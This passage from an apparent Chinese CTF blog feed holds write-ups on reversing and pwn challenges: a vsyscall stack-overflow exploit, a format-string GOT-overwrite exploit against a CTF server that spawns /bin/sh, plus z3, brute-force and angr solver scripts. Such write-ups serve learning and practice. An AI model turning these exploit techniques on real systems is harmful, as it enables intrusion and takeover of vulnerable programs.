</span><br><span class="line"> *  *  0  0  *  *  *  *  *  *  *  *  0  0  *  * </span><br><span class="line"> *  *  0  0  0  x  0  *  0  0  0  0  0  0  *  * </span><br><span class="line"> *  *  0  *  *  0  0  0  0  0  *  *  *  0  0  * </span><br><span class="line"> *  *  0  *  *  0  *  *  0  0  *  @  0  0  0  * </span><br><span class="line"> *  *  0  0  *  0  0  0  P  0  *  *  *  *  *  * </span><br><span class="line"> *  *  0  0  *  *  *  *  0  *  *  *  *  *  *  * </span><br><span class="line"> *  *  0  *  *  *  *  *  X  *  *  0  0  0  *  * </span><br><span class="line"> *  0  0  *  @  *  0  *  0  0  0  0  *  0  *  * </span><br><span class="line"> *  0  0  0  0  0  0  0  0  *  *  *  *  0  *  * </span><br><span class="line"> *  0  0  0  0  *  *  *  0  *  0  0  0  0  *  * </span><br><span class="line"> *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *]</span><br></pre></td></tr></table></figure><p>玩家初始的位置用P表示，两个箱子用x表示，终点用@表示，不能推到*上，所以沿着0推就行了。</p><p>操作顺序：wwaawaaawasssssssasddsdwddddwwwwwsaaawwdddsdwawddddwdssdsaa</p><p>用W540替换：<br>WW44W444W45555555450050W0000WWWWW5444WW00050W4W0000W0550544</p><p>输入这个应该就可以得到flag了。</p><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>看了github上的脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./babystack&apos;)</span><br><span class="line">p.sendline(p64(0xffffffffff600000)*5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>orz其实完全不懂为啥，问了大佬然而大佬没看题目，后来偶然在群里看见有人说是vsyscall啥的，百度了一波，结果找到了之前就看过的<a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">一篇有关pie的教程</a>。</p><p>如果仔细看看的话，在第三部分就能发现对vsyscall的介绍啥的……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define VSYSCALL_ADDR_vgettimeofday   0xffffffffff600000</span><br></pre></td></tr></table></figure><p>脚本中<code>0xffffffffff600000</code>就是调用<code>gettimeofday</code>函数吧。</p><p>题目源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void vul()</span><br><span class="line">&#123;</span><br><span class="line">char a[10];</span><br><span class="line">int n = readn(a,256);</span><br><span class="line">if(n%8 != 0) exit(0);</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">vul();</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">func();</span><br><span class="line">system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出一直覆盖到exit的返回地址之前，然后执行完vsyscall之后就会往下执行<code>system(&quot;/bin/sh&quot;)</code>了吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2018/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2018/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<p>printf()函数如果没有给定格式化参数，就可以利用它来任意读写。<br>像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用<code>%位置$x</code>这样的形式来读取canary。</p><p>利用<code>%num$n</code>的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。<br>例如<code>\x02\x03\x04\x08%num$n</code>就是在0x08040302的位置写上4，因为<code>\x02\x03\x04\x08</code>是四个字节。如果想多写一点的话可以用<code>\x02\x03\x04\x08%12c%num$n</code>这样的，就有16个字节，就写上了10（十六进制表示）。</p><p>例如whalectf上的pwn3:</p><p>利用格式化字符串，把printf的got表覆盖为system函数，这样下次调用printf的时候就是调用system函数了。但是%n的话是一次性写4个字节，会发送很多数据，因为每多写1就要多发送一个字节。可以使用%hhn对一个字节进行写。这里system_plt的第一个字节是0x10，而前面payload正好已经发送了16个字节，所以就不需要再添加字节，直接<code>%7$hhn</code>就行了。至于第一个可控制的位置，可以先调试一下程序，发送一下AAAAAAAAA，然后看栈里的数据就很容易知道是7了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;bamboofox.cs.nctu.edu.tw&quot;,22003)</span><br><span class="line">printf_got=0x0804a00c</span><br><span class="line">system_plt=0x08048410</span><br><span class="line">payload=p32(printf_got)</span><br><span class="line">payload+=p32(printf_got+1)</span><br><span class="line">payload+=p32(printf_got+2)</span><br><span class="line">payload+=p32(printf_got+3)</span><br><span class="line">payload+=&quot;%7$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x84-0x10)</span><br><span class="line">payload+=&quot;c%8$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x104-0x84)</span><br><span class="line">payload+=&quot;c%9$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x08-0x04)</span><br><span class="line">payload+=&quot;c%10$hhn&quot;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>z3求解</title>
      <link href="/2018/11/20/z3%E6%B1%82%E8%A7%A3/"/>
      <url>/2018/11/20/z3%E6%B1%82%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>之前<a href="https://sh1rker.github.io/2018/10/25/sus-gccc/" target="_blank" rel="noopener">有题</a>应该使用z3求解的一直没有完成，今天就好好学习一下z3，把这题解决了顺便记录一下z3求解的使用！</p><p>z3求解大致模版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x=Int(&apos;x&apos;)      //定义变量</span><br><span class="line">solver=Solver() //构造求解器</span><br><span class="line">solver.add(x==1)//添加约束条件</span><br><span class="line">if solver.check()==sat: //如果有解返回值为sat否则返回unsat</span><br><span class="line">print solver.model() //打印解</span><br></pre></td></tr></table></figure><p>之前一题的z3使用分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">num=BitVec(&quot;num&quot;,33)      //这里定义了num为一个32位的二进制数字，至于为什么要写33，是我尝试了很多次无解后发现写33就有解了2333</span><br><span class="line">array=[     </span><br><span class="line">            164,</span><br><span class="line">25,</span><br><span class="line">4,</span><br><span class="line">130,</span><br><span class="line">126,</span><br><span class="line">158,</span><br><span class="line">91,</span><br><span class="line">199,</span><br><span class="line">173,</span><br><span class="line">252,</span><br><span class="line">239,</span><br><span class="line">143,</span><br><span class="line">150,</span><br><span class="line">251,</span><br><span class="line">126,</span><br><span class="line">39,</span><br><span class="line">104,</span><br><span class="line">104,</span><br><span class="line">146,</span><br><span class="line">208,</span><br><span class="line">249,</span><br><span class="line">9,</span><br><span class="line">219,</span><br><span class="line">208,</span><br><span class="line">101,</span><br><span class="line">182,</span><br><span class="line">62,</span><br><span class="line">92,</span><br><span class="line">6,</span><br><span class="line">27,</span><br><span class="line">5,</span><br><span class="line">46]</span><br><span class="line">b=range(32)</span><br><span class="line">for i in range(32):</span><br><span class="line">temp=0</span><br><span class="line">for j in range(i):</span><br><span class="line">temp^=array[j]</span><br><span class="line">b[i]=temp</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;)).   //根据题目添加条件</span><br><span class="line">solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))</span><br><span class="line">solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))</span><br><span class="line">solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))</span><br><span class="line">solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))</span><br><span class="line">for i in range(5,31)://多次重复的输入可以用循环来操作</span><br><span class="line">solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=90)</span><br><span class="line">solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=65)</span><br><span class="line">solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))</span><br><span class="line">if solver.check()==sat :</span><br><span class="line">print solver.model()   //得到正确的num</span><br></pre></td></tr></table></figure><p>这种简单的z3求解的运用不是很难，但是却比爆破之类的方法来的快很多。<br>其实今天也没学习多少有关z3的，之前一直无解只有因为定义的时候没用33……</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>basic-re-su</title>
      <link href="/2018/11/07/basic-re-su/"/>
      <url>/2018/11/07/basic-re-su/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">v4 = 2;</span><br><span class="line">  v5 = 3;</span><br><span class="line">  v6 = 2;</span><br><span class="line">  v7 = 1;</span><br><span class="line">  v8 = 4;</span><br><span class="line">  v9 = 7;</span><br><span class="line">  v10 = 4;</span><br><span class="line">  v11 = 5;</span><br><span class="line">  v12 = 10;</span><br><span class="line">  v13 = 11;</span><br><span class="line">  v14 = 10;</span><br><span class="line">  v15 = 9;</span><br><span class="line">  v16 = 14;</span><br><span class="line">  v17 = 15;</span><br><span class="line">  v18 = 12;</span><br><span class="line">  v19 = 13;</span><br><span class="line">  v20 = 16;</span><br><span class="line">  v21 = 19;</span><br><span class="line">  v22 = 16;</span><br><span class="line">  v23 = 17;</span><br><span class="line">  v24 = 20;</span><br><span class="line">  v25 = 23;</span><br><span class="line">  v26 = 22;</span><br><span class="line">  v27 = 19;</span><br><span class="line">  v28 = 28;</span><br><span class="line">  v29 = 25;</span><br><span class="line">  v30 = 30;</span><br><span class="line">  v31 = 31;</span><br><span class="line">  v32 = 28;</span><br><span class="line">  v33 = 25;</span><br><span class="line">  v34 = 26;</span><br><span class="line">  v35 = 31;</span><br><span class="line">  v36 = 36;</span><br><span class="line">  v37 = 33;</span><br><span class="line">  v38 = 34;</span><br><span class="line">  v39 = 39;</span><br><span class="line">  v40 = 36;</span><br><span class="line">  v41 = 33;</span><br><span class="line">  v42 = 34;</span><br><span class="line">  v43 = 35;</span><br><span class="line">  v44 = 40;</span><br><span class="line">  v45 = 41;</span><br><span class="line">  v46 = 46;</span><br><span class="line">  v47 = 43;</span><br><span class="line">  v48 = 36;</span><br><span class="line">  v49 = 45;</span><br><span class="line">  v50 = 38;</span><br><span class="line">  v51 = 47;</span><br><span class="line">  v52 = 56;</span><br><span class="line">  v53 = 49;</span><br><span class="line">  v54 = 58;</span><br><span class="line">  v55 = 59;</span><br><span class="line">  v56 = 52;</span><br><span class="line">  v57 = 61;</span><br><span class="line">  v58 = 62;</span><br><span class="line">  v59 = 55;</span><br><span class="line">  v60 = 48;</span><br><span class="line">  v61 = 57;</span><br><span class="line">  v62 = 50;</span><br><span class="line">  v63 = 59;</span><br><span class="line">  v64 = 60;</span><br><span class="line">  v65 = 53;</span><br><span class="line">  v66 = 54;</span><br><span class="line">  v67 = 55;</span><br><span class="line">  v68 = 72;</span><br><span class="line">  v69 = 73;</span><br><span class="line">  v70 = 66;</span><br><span class="line">  v71 = 66;</span><br><span class="line">  v72 = 68;</span><br><span class="line">  v73 = 68;</span><br><span class="line">  v74 = 70;</span><br><span class="line">  v75 = 71;</span><br><span class="line">  v76 = 72;</span><br><span class="line">  v77 = 73;</span><br><span class="line">  v78 = 74;</span><br><span class="line">  v79 = 74;</span><br><span class="line">  v80 = 77;</span><br><span class="line">  v81 = 77;</span><br><span class="line">  v82 = 79;</span><br><span class="line">  v83 = 78;</span><br><span class="line">  v84 = 80;</span><br><span class="line">  v85 = 80;</span><br><span class="line">  v86 = 82;</span><br><span class="line">  v87 = 83;</span><br><span class="line">  v88 = 85;</span><br><span class="line">  v89 = 84;</span><br><span class="line">  v90 = 86;</span><br><span class="line">  v91 = 87;</span><br><span class="line">  v92 = 89;</span><br><span class="line">  v93 = 89;</span><br><span class="line">  v94 = 90;</span><br><span class="line">  v95 = 91;</span><br><span class="line">  v96 = 92;</span><br><span class="line">  v97 = 93;</span><br><span class="line">  v98 = 94;</span><br><span class="line">  v99 = 94;</span><br><span class="line">  v100 = 96;</span><br><span class="line">  v101 = 96;</span><br><span class="line">  v102 = 99;</span><br><span class="line">  v103 = 99;</span><br><span class="line">  v104 = 100;</span><br><span class="line">  v105 = 101;</span><br><span class="line">  v106 = 103;</span><br><span class="line">  v107 = 103;</span><br><span class="line">  v108 = 105;</span><br><span class="line">  v109 = 105;</span><br><span class="line">  v110 = 107;</span><br><span class="line">  v111 = 107;</span><br><span class="line">  v112 = 108;</span><br><span class="line">  v113 = 109;</span><br><span class="line">  v114 = 110;</span><br><span class="line">  v115 = 110;</span><br><span class="line">  v116 = 112;</span><br><span class="line">  v117 = 112;</span><br><span class="line">  v118 = 114;</span><br><span class="line">  v119 = 115;</span><br><span class="line">  v120 = 116;</span><br><span class="line">  v121 = 117;</span><br><span class="line">  v122 = 119;</span><br><span class="line">  v123 = 119;</span><br><span class="line">  v124 = 120;</span><br><span class="line">  v125 = 121;</span><br><span class="line">  v126 = 123;</span><br><span class="line">  v127 = 123;</span><br><span class="line">  v128 = 125;</span><br><span class="line">  v129 = 125;</span><br><span class="line">  v130 = 127;</span><br><span class="line">  v131 = 127;</span><br><span class="line">  v132 = 129;</span><br><span class="line">  v133 = 129;</span><br><span class="line">  v134 = 131;</span><br><span class="line">  v135 = 131;</span><br><span class="line">  v136 = 140;</span><br><span class="line">  v137 = 141;</span><br><span class="line">  v138 = 142;</span><br><span class="line">  v139 = 143;</span><br><span class="line">  v140 = 136;</span><br><span class="line">  v141 = 137;</span><br><span class="line">  v142 = 138;</span><br><span class="line">  v143 = 139;</span><br><span class="line">  v144 = 140;</span><br><span class="line">  v145 = 141;</span><br><span class="line">  v146 = 142;</span><br><span class="line">  v147 = 135;</span><br><span class="line">  v148 = 152;</span><br><span class="line">  v149 = 145;</span><br><span class="line">  v150 = 146;</span><br><span class="line">  v151 = 147;</span><br><span class="line">  v152 = 148;</span><br><span class="line">  v153 = 149;</span><br><span class="line">  v154 = 150;</span><br><span class="line">  v155 = 151;</span><br><span class="line">  v156 = 152;</span><br><span class="line">  v157 = 153;</span><br><span class="line">  v158 = 154;</span><br><span class="line">  v159 = 154;</span><br><span class="line">  v160 = 156;</span><br><span class="line">  v161 = 156;</span><br><span class="line">  v162 = 158;</span><br><span class="line">  v163 = 158;</span><br><span class="line">  v164 = 160;</span><br><span class="line">  v165 = 160;</span><br><span class="line">  v166 = 162;</span><br><span class="line">  v167 = 162;</span><br><span class="line">  v168 = 164;</span><br><span class="line">  v169 = 164;</span><br><span class="line">  v170 = 166;</span><br><span class="line">  v171 = 166;</span><br><span class="line">  v172 = 168;</span><br><span class="line">  v173 = 168;</span><br><span class="line">  v174 = 170;</span><br><span class="line">  v175 = 170;</span><br><span class="line">  v176 = 172;</span><br><span class="line">  v177 = 172;</span><br><span class="line">  v178 = 174;</span><br><span class="line">  v179 = 174;</span><br><span class="line">  v180 = 176;</span><br><span class="line">  v181 = 177;</span><br><span class="line">  v182 = 178;</span><br><span class="line">  v183 = 179;</span><br><span class="line">  memset(v184, 0, 0x1Fui64);</span><br><span class="line">  sub_140011159(std::cout, &quot;flag format: SUCTF&#123;xxxxxxxxxxxxxxx&#125;\n&quot;);</span><br><span class="line">  sub_140011159(std::cout, &quot;Please Input Key:&quot;);</span><br><span class="line">  std::basic_istream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&gt;&gt;(std::cin, &amp;v186);</span><br><span class="line">  v186 %= 0x10000u;</span><br><span class="line">  v185 = 8;</span><br><span class="line">  while ( v185 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v185;</span><br><span class="line">    for ( j = 22; j; v184[j] |= v189 &lt;&lt; v185 )</span><br><span class="line">    &#123;</span><br><span class="line">      v188 = *(&amp;v4 + 22 * v185 + --j);</span><br><span class="line">      v189 = (v188 &gt;&gt; ((v186 &gt;&gt; 2 * v185) &amp; 3)) &amp; 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011159(std::cout, v184);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  sub_1400113A7((__int64)&amp;v3, (__int64)&amp;unk_14001AD10);</span><br><span class="line">  return 0i64;</span><br></pre></td></tr></table></figure><p>这一题很简单，只是在爆破的时候遇到几个坑(因为自己的鶸），所以记录一下。</p><p>程序流程就是输入一个key，大小为<code>0x0001~0xffff</code>。经过运算后输出v184，给了flag格式直接爆破就是了。</p><p>但是ida初始化是，v4后面大于127的值都默认显示成了负数，这样是爆破不出来的，按两次h转换成正数。</p><p>其他就是爆破时的逻辑了，基本上照着原代码copy就行了。</p><p>爆破脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">value=[2,3,2,1,4,7,4,5,10,11,10,9,14,15,12,13,16,19,16,17,20,23,22,19,28,25,30,31,28,25,26,31,36,33,34,39,36,33,34,35,40,41,46,43,36,45,38,47,56,49,58,59,52,61,62,55,48,57,50,59,60,53,54,55,72,73,66,66,68,68,70,71,72,73,74,74,77,77,79,78,80,80,82,83,85,84,86,87,89,89,90,91,92,93,94,94,96,96,99,99,100,101,103,103,105,105,107,107,108,109,110,110,112,112,114,115,116,117,119,119,120,121,123,123,125,125,127,127,129,129,131,131,140,141,142,143,136,137,138,139,140,141,142,135,152,145,146,147,148,149,150,151,152,153,154,154,156,156,158,158,160,160,162,162,164,164,166,166,168,168,170,170,172,172,174,174,176,177,178,179]</span><br><span class="line">for key in range(0xffff):</span><br><span class="line">flagnc=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]</span><br><span class="line">for i in range(7,-1,-1):</span><br><span class="line">for j in range(21,-1,-1):</span><br><span class="line">v188=value[22*i+j]</span><br><span class="line">v189=(v188&gt;&gt;((key&gt;&gt;2*i)&amp;3))&amp;1</span><br><span class="line">flagnc[j]|=v189&lt;&lt;i</span><br><span class="line">flag=&quot;&quot;.join([chr(ch) for ch in flagnc])</span><br><span class="line">if ~flag.find(&quot;SUCTF&#123;&quot;):</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>符号执行Angr</title>
      <link href="/2018/11/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8CAngr/"/>
      <url>/2018/11/03/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8CAngr/</url>
      
        <content type="html"><![CDATA[<p><em>突然发现记录一些简单题的做题过程只会浪费时间，以后就不记录特别简单的题了（虽然难的题也不会写XD</em></p><p>今天在做whalectf上面的题目时，有两道类型差不多的题，但是一道用爆破解出来了，<a href="http://whalectf.xin/challenges#crackme(ais3" target="_blank" rel="noopener">另一道</a>)却解不出来，查找writeup的时候找不到一样的题目，但是找到了类似的题目，并且发现了符号执行这个东西，学习后掌握了新的解题技巧。</p><p>首先要安装angr库，具体操作方法可以百度。</p><p>解题脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import angr </span><br><span class="line">import claripy </span><br><span class="line">p = angr.Project(&quot;./ais3_crackme&quot;) </span><br><span class="line">argv1=claripy.BVS(&apos;argv1&apos;,24*8)</span><br><span class="line">state=p.factory.entry_state(args=[&apos;./ais3_crackme&apos;,argv1])</span><br><span class="line">simgr=p.factory.simgr(state)</span><br><span class="line">simgr.explore(find=0x400602,avoid=0x40060e)</span><br><span class="line">print simgr.found[0].solver.eval(argv1,cast_to=str)</span><br></pre></td></tr></table></figure><p>其中：</p><p><code>p = angr.Project(&quot;./ais3_crackme&quot;)</code></p><p>为每一个angr脚本必备</p><p><code>argv1=claripy.BVS(&#39;argv1&#39;,24*8)</code></p><p>是以二进制形式设一个参数，ida分析程序得知参数长度为24</p><p><code>state=p.factory.entry_state(args=[&#39;./ais3_crackme&#39;,argv1])</code></p><p>获取程序的初始状态</p><p><code>simgr=p.factory.simgr(state)</code></p><p>遍历路径</p><p><code>simgr.explore(find=0x400602,avoid=0x40060e)</code></p><p>设定成功与失败的路径结果，地址由ida分析得</p><p><code>print simgr.found[0].solver.eval(argv1,cast_to=str)</code></p><p>以字符串形式输出结果</p><p>这一题几乎是照抄着写了一遍，因此再把之前那道<a href="http://whalectf.xin/challenges#r100(defcamp" target="_blank" rel="noopener">简单的题</a>)拿出来练一下手。</p><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import angr </span><br><span class="line">p = angr.Project(&quot;./r100&quot;) </span><br><span class="line">state=p.factory.entry_state(args=[&apos;./r100&apos;])</span><br><span class="line">simgr=p.factory.simgr(state)</span><br><span class="line">simgr.explore(find=0x400844,avoid=0x400855)</span><br><span class="line">print simgr.found[0].posix.dumps(0)</span><br></pre></td></tr></table></figure><p>但还是不太熟练，可至少拥有了两个简单的模版XD</p><p>再摘录一下<a href="http://www.freebuf.com/articles/web/150296.html" target="_blank" rel="noopener">freebuf上的较通用脚本</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 